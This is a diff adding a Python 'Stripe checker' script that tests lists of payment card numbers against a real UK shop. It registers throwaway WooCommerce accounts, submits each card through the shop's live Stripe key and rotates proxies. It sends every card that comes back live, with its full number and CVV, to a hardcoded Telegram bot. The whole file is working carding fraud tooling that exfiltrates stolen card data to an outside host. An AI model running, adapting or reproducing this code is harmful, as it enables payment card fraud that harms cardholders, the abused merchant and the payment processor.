@@ -1,1 +1,400 @@
+import os
+import time
+import requests
+import random
+import uuid
+import secrets
+import re
+import sys
+import threading
+from datetime import datetime
+from colorama import Fore, Style, init
+from urllib.parse import quote, unquote, urlencode
 
+try:
+    import pyfiglet
+except ImportError:
+    pyfiglet = None
+
+PROXY_TARGET = "https://sakukshop.com/"
+PROXY_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+)
+PROXY_SCHEMES = ("http", "https", "socks4", "socks4a", "socks5", "socks5h")
+GATEWAY_NAME = "Stripe Auth"
+ANSI = re.compile(r"\x1b\[[0-9;]*m")
+
+# زانیارییەکانی تێلگرام
+TELEGRAM_TOKEN = "9150507049:AAHSJTvQoWQMPyKEzNSRfzi8yysPgX7Luuk"
+TELEGRAM_CHAT_ID = "2050718305"
+
+def send_to_telegram(message):
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": message,
+        "parse_mode": "Markdown"
+    }
+    try:
+        requests.post(url, data=payload, timeout=10)
+    except Exception as e:
+        pass
+
+
+def _supports(char):
+    encoding = getattr(sys.stdout, "encoding", None) or "ascii"
+    try:
+        char.encode(encoding)
+        return True
+    except (UnicodeEncodeError, LookupError):
+        return False
+
+
+def _symbol(char, fallback):
+    return char if _supports(char) else fallback
+
+
+TICK = _symbol("✔", "[+]")
+CROSS = _symbol("✖", "[-]")
+PROMPT = _symbol("▹", ">")
+BRACKET = _symbol("↳", "[")
+
+
+class Spinner:
+    BRAILLE = ("⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏")
+    DOTS = (".", "..", "...", "....", "...", "..")
+
+    def __init__(self, text, duration=4.0, fps=8):
+        self.text = text
+        self.duration = duration
+        self.fps = max(1, fps)
+        self.frames = self._build_frames()
+        self._stop = threading.Event()
+        self._thread = None
+
+    def _build_frames(self):
+        base = self.DOTS
+        steps = max(1, int(round(self.duration * self.fps)))
+        return [base[i % len(base)] for i in range(steps)]
+
+    def _line(self, frame):
+        return f"{BRACKET} {self.text} {frame}"
+
+    def _spin(self):
+        frame_index = 0
+        delay = 1 / self.fps
+        sys.stdout.write("\n")
+        sys.stdout.flush()
+
+        while not self._stop.is_set():
+            frame = self.frames[frame_index % len(self.frames)]
+            sys.stdout.write(
+                "\033[s"
+                "\033[1A"
+                "\r" + self._line(frame)
+                + "\033[K"
+                "\033[u"
+            )
+            sys.stdout.flush()
+            frame_index += 1
+            self._stop.wait(delay)
+
+    def _halt(self):
+        self._stop.set()
+        if self._thread is not None:
+            self._thread.join()
+            self._thread = None
+        sys.stdout.write("\033[1B\r")
+        sys.stdout.flush()
+
+    def replace(self, line):
+        self._halt()
+        sys.stdout.write("\r" + line + "\033[K\n")
+        sys.stdout.flush()
+
+    def __enter__(self):
+        if not sys.stdout.isatty():
+            print(f"{BRACKET} {self.text}")
+            return self
+        self._thread = threading.Thread(target=self._spin, daemon=True)
+        self._thread.start()
+        return self
+
+    def __exit__(self, *_):
+        self._halt()
+        return False
+
+
+class Counter:
+    def __init__(self):
+        self.live = 0
+        self.declined = 0
+        self.three_ds = 0
+        self._width = 0
+
+    def update(self, result):
+        if result == "live":
+            self.live += 1
+        elif result == "declined":
+            self.declined += 1
+        elif result == "3ds":
+            self.three_ds += 1
+        return self
+
+    def text(self):
+        return (
+            f"{Fore.LIGHTGREEN_EX}LIVE: {Fore.LIGHTWHITE_EX}{self.live}{Style.RESET_ALL}"
+            f"{Fore.LIGHTBLACK_EX}  |  {Style.RESET_ALL}"
+            f"{Fore.LIGHTRED_EX}DECLINED: {Fore.LIGHTWHITE_EX}{self.declined}{Style.RESET_ALL}"
+            f"{Fore.LIGHTBLACK_EX}  |  {Style.RESET_ALL}"
+            f"{Fore.YELLOW}THREE3DS: {Fore.LIGHTWHITE_EX}{self.three_ds}{Style.RESET_ALL}"
+        )
+
+    def render(self):
+        line = self.text()
+        visible = len(ANSI.sub("", line))
+        sys.stdout.write("\r" + line + " " * max(0, self._width - visible))
+        sys.stdout.flush()
+        self._width = visible
+
+    def clear(self):
+        if not self._width:
+            return
+        sys.stdout.write("\r" + " " * self._width + "\r")
+        sys.stdout.flush()
+        self._width = 0
+
+
+COUNTER = Counter()
+init(autoreset=True)
+
+Browser = [
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+]
+
+def load_cards(filename):
+    if not filename.lower().endswith(".txt"):
+        raise ValueError("File must have .txt extension")
+    cards = []
+    try:
+        with open(filename, "r", encoding="utf-8") as file:
+            for line in file:
+                line = line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                parts = line.split("|")
+                if len(parts) != 4:
+                    continue
+                cc, mm_raw, yy_raw, cvv = (part.strip() for part in parts)
+                if not cc.isdigit() or not mm_raw.isdigit() or not yy_raw.isdigit() or not cvv.isdigit():
+                    continue
+                mm = mm_raw.zfill(2)
+                yy = yy_raw[-2:] if len(yy_raw) == 4 else yy_raw.zfill(2)
+                if not 1 <= int(mm) <= 12:
+                    continue
+                cards.append({"cc": cc, "mm": mm, "yy": yy, "cvv": cvv})
+    except OSError as exc:
+        raise OSError(f"Failed to read file: {exc}") from exc
+    return cards
+
+
+def gstr(source: str, start: str, end: str) -> str | None:
+    try:
+        return source.split(start, 1)[1].split(end, 1)[0]
+    except IndexError:
+        return ""
+
+
+def parse_proxy_string(raw):
+    text = (raw or "").strip().strip("'\"")
+    if not text:
+        return None
+    scheme = None
+    if "://" in text:
+        scheme, text = text.split("://", 1)
+        scheme = scheme.strip().lower()
+    username = password = None
+    if "@" in text:
+        creds, text = text.rsplit("@", 1)
+        if ":" in creds:
+            username, password = creds.split(":", 1)
+        else:
+            username, password = creds, ""
+        host, _, port = text.rpartition(":")
+    else:
+        parts = text.split(":")
+        if len(parts) >= 4:
+            host, port = parts[0], parts[1]
+            username = parts[2]
+            password = ":".join(parts[3:])
+        elif len(parts) == 3:
+            host, port = parts[0], parts[1]
+            username, password = parts[2], ""
+        else:
+            host = parts[0]
+            port = parts[1] if len(parts) == 2 else None
+
+    host = host.strip().strip("[]")
+    port = int(port) if port is not None else None
+    scheme = scheme or "http"
+    auth = f"{quote(username, safe='')}:{quote(password or '', safe='')}@" if username else ""
+    url = f"{scheme}://{auth}{host}"
+    if port is not None:
+        url += f":{port}"
+    return {"scheme": scheme, "host": host, "port": port, "url": url}
+
+
+def proxy_dict(parsed):
+    return {"http": parsed["url"], "https": parsed["url"]}
+
+
+def validate_proxy(proxy, target=PROXY_TARGET):
+    if not proxy:
+        return None
+    try:
+        parsed = parse_proxy_string(proxy)
+    except Exception:
+        return None
+    try:
+        resp = requests.get(target, proxies=proxy_dict(parsed), timeout=15, headers={"user-agent": PROXY_UA})
+        if resp.status_code == 200:
+            return parsed
+    except Exception:
+        pass
+    return None
+
+
+def print_banner():
+    if pyfiglet is not None:
+        try:
+            art = pyfiglet.figlet_format("CHKA", font="slant")
+        except Exception:
+            art = pyfiglet.figlet_format("CHKA")
+        print(f"{Fore.CYAN}{art}{Style.RESET_ALL}")
+    else:
+        print(f"{Fore.CYAN}{'CHKA'}{Style.RESET_ALL}")
+    rule = "-" * 62
+    print(f"{Fore.LIGHTBLACK_EX}{rule}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}  Stripe checker auth{Style.RESET_ALL}{Fore.LIGHTBLACK_EX}  |  Telegram integrated.{Style.RESET_ALL}")
+    print(f"{Fore.LIGHTBLACK_EX}{rule}{Style.RESET_ALL}")
+
+
+def donate(card, proxy=None):
+    cc = card.get('cc')
+    mm = card.get('mm')
+    yy = card.get('yy')
+    cvv = card.get('cvv')
+    email = f"{secrets.token_hex(3)}{int(time.time()*1000)%100000}@gmail.com"
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    brwser = random.choice(Browser)
+    ss = requests.Session()
+    
+    if proxy:
+        parsed = validate_proxy(proxy)
+        if parsed:
+            ss.proxies.update(proxy_dict(parsed))
+
+    kind = "declined"
+    verdicts = [f"{Fore.LIGHTRED_EX}unknown{Style.RESET_ALL}"]
+
+    def report():
+        COUNTER.clear()
+        print(f"{Fore.LIGHTWHITE_EX}{cc}|{mm}|{yy}|{cvv}{Style.RESET_ALL} ---> " + "  ".join(verdicts))
+        COUNTER.update(kind)
+        COUNTER.render()
+
+    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+    try:
+        response = ss.get('https://cucciobeauty.co.uk/my-account/', headers=headers, timeout=15)
+        regnonce = gstr(response.text, 'name="woocommerce-register-nonce" value="', '"')
+
+        data = {
+            'email': email,
+            'woocommerce-register-nonce': regnonce,
+            '_wp_http_referer': '/my-account/',
+            'register': 'Register',
+        }
+        ss.post('https://cucciobeauty.co.uk/my-account/', headers=headers, data=data, timeout=15)
+        response = ss.get('https://cucciobeauty.co.uk/my-account/add-payment-method/', headers=headers, timeout=15)
+        create_payment_intent = gstr(response.text, 'createAndConfirmSetupIntentNonce":"', '"')
+
+        stripe_headers = {'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded'}
+        stripe_data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&key=pk_live_51JEunOFB9sxchd5wgpRZnP6VAcniiIT3GWrIFzvKSFRDhg8i8Y02LWk7DpmumzYLOfX5sv7yQJllm3Ir7pqSCBNq00eOAzeWWn'
+        
+        resp_stripe = ss.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=15)
+        idpm = gstr(resp_stripe.text, '"id": "', '"')
+        
+        if not idpm:
+            message = gstr(resp_stripe.text, '"message": "', '"')
+            kind = "declined"
+            verdicts = [f"{Fore.LIGHTRED_EX}{message}{Style.RESET_ALL}"]
+            report()
+            return
+
+        ajax_data = {
+            'action': 'wc_stripe_create_and_confirm_setup_intent',
+            'wc-stripe-payment-method': idpm,
+            'wc-stripe-payment-type': 'card',
+            '_ajax_nonce': create_payment_intent,
+        }
+        resp_ajax = ss.post('https://cucciobeauty.co.uk/wp-admin/admin-ajax.php', headers=headers, data=ajax_data, timeout=15)
+        status = gstr(resp_ajax.text, '"status":"', '"')
+        message1 = gstr(resp_ajax.text, '"message":"', '"')
+
+        if status == "succeeded":
+            kind = "live"
+            verdicts = [f"{Fore.LIGHTGREEN_EX}{status}{Style.RESET_ALL}"]
+            # ناردنی کارتەکە بۆ تێلگرام کاتێک لایڤ بوو
+            telegram_msg = f"🔥 *LIVE CARD FOUND!*\n💳 `{cc}|{mm}|{yy}|{cvv}`\n🌐 *Gateway:* {GATEWAY_NAME}\n✅ *Status:* Succeeded"
+            send_to_telegram(telegram_msg)
+        elif message1:
+            kind = "declined"
+            verdicts = [f"{Fore.LIGHTRED_EX}{message1}{Style.RESET_ALL}"]
+        else:
+            kind = "declined"
+            verdicts = [f"{Fore.LIGHTRED_EX}Declined by gateway{Style.RESET_ALL}"]
+
+    except Exception as e:
+        kind = "declined"
+        verdicts = [f"{Fore.LIGHTRED_EX}Error: {str(e)[:30]}{Style.RESET_ALL}"]
+
+    COUNTER.clear()
+    print(f"{Fore.LIGHTWHITE_EX}{cc}|{mm}|{yy}|{cvv}{Style.RESET_ALL} ---> " + "  ".join(verdicts))
+    COUNTER.update(kind)
+    COUNTER.render()
+
+
+if __name__ == '__main__':
+    os.system("cls" if os.name == "nt" else "clear")
+    print_banner()
+    raw = input(f"{Fore.CYAN}{PROMPT} Enter card:{Style.RESET_ALL} ").strip().strip("'\"")
+    proxy = input(f"{Fore.CYAN}{PROMPT} Enter proxy:{Style.RESET_ALL} ").strip().strip("'\"")
+
+    card = None
+    cards = None
+
+    if raw:
+        if raw.endswith('.txt') and os.path.isfile(raw):
+            cards = load_cards(raw)
+        else:
+            parts = raw.split('|')
+            if len(parts) not in (3, 4):
+                print(f"{Fore.LIGHTRED_EX}{PROMPT} Invalid card format. Expected cc|mm|yy|cvv{Style.RESET_ALL}")
+                raise SystemExit(1)
+            cc = parts[0].strip()
+            mm = parts[1].strip().zfill(2)
+            yy = parts[2].strip()[2:] if len(parts[2].strip()) == 4 else parts[2].strip().zfill(2)
+            cvv = parts[3].strip() if len(parts) == 4 else ''
+            card = {'cc': cc, 'mm': mm, 'yy': yy, 'cvv': cvv}
+
+    print(f"{Fore.LIGHTCYAN_EX}{PROMPT} Gateway{Style.RESET_ALL}{Fore.LIGHTBLACK_EX} : {Style.RESET_ALL}{Fore.LIGHTWHITE_EX}{GATEWAY_NAME}{Style.RESET_ALL}")
+    print(f"{Fore.LIGHTBLACK_EX}{'-' * 63}{Style.RESET_ALL}")
+    COUNTER.render()
+
+    if cards:
+        for item in cards:
+            donate(item, proxy)
+    elif card:
+        donate(card, proxy)
